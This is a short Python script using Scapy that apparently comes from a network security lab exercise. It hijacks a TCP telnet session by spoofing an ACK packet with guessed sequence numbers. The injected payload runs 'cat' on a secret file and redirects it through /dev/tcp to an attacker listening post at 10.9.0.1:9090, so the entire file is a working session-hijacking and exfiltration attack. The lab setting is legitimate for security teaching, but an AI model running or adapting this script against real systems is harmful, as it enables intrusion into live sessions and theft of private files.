#!/bin/python3
from scapy.all import *
import sys

# Fill with values found during analysis
intSourcePort = 0
intNextSequenceNumber = 0
intAcknowledgementValue = 0

# Attacker listening post
strListeningIP = "10.9.0.1"
intListeningPort = 9090

# Targeting victim/server container's telnet port
strSourceIP = "10.9.0.5"
strDestinationIP = "10.9.0.6"
intDestinationPort =  23

# Build the IP layer of the packet
lyrIP = IP(src=strSourceIP, dst=strDestinationIP)

# Build TCP layer of the packet
lyrTCP = TCP(sport=intSourcePort,
             dport=intDestinationPort,
             flags="A",
             seq=intNextSequenceNumber,
             ack=intAcknowledgementValue)

# Add the data we want to retrieve
strData = "\rcat /home/seed/secret.txt > /dev/tcp/{listening_ip}/{listening_port}\r" \
          .format(listening_ip=strListeningIP, listening_port=intListeningPort)

# Build the full packet and show it
pktResetPacket = lyrIP / lyrTCP / strData
pktResetPacket.show()

# Send the packet
send(pktResetPacket, verbose=0)
